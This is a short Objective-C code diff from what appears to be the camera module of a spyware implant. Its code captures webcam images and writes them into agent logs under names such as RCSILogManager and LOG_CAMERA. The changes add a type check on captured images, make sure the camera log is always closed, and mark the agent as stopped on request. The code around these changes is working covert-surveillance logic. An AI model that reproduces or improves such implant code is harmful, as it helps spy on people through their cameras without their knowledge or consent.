@@ -174,7 +174,7 @@ typedef struct _cameraStruct
   
   image = runCamera(1);
   
-  if (image != nil)
+  if (image != nil && [image isKindOfClass: [NSData class]])
     {
       RCSILogManager *logManager = [RCSILogManager sharedInstance];
       
@@ -187,10 +187,12 @@ typedef struct _cameraStruct
           [logManager writeDataToLog: (NSMutableData*)image 
                             forAgent: LOG_CAMERA
                            withLogID: 0];
-        
-          [logManager closeActiveLog: LOG_CAMERA
-                           withLogID: 0];
         }
+        
+    
+      [logManager closeActiveLog: LOG_CAMERA
+                     withLogID: 0];
+                     
 #ifdef DEBUG_CAMERA
     NSLog(@"%s:image 1 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
 #endif
@@ -214,14 +216,14 @@ typedef struct _cameraStruct
   
   if (success == TRUE)
     {
-    [logManager writeDataToLog: (NSMutableData*)image 
-                      forAgent: LOG_CAMERA
-                     withLogID: 0];
-    
-    [logManager closeActiveLog: LOG_CAMERA
-                     withLogID: 0];
+      [logManager writeDataToLog: (NSMutableData*)image 
+                        forAgent: LOG_CAMERA
+                       withLogID: 0];
     }
     
+  [logManager closeActiveLog: LOG_CAMERA
+                   withLogID: 0];
+                   
 #ifdef DEBUG_CAMERA
   NSLog(@"%s:image 2 %#x ret count %d", __FUNCTION__, image, [image retainCount]);
 #endif
@@ -285,6 +287,12 @@ typedef struct _cameraStruct
         }
     
       [innerPool release];
+    }
+    
+  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
+    {
+      [mAgentConfiguration setObject: AGENT_STOPPED
+                              forKey: @"status"];
     }
     
   [outerPool release];
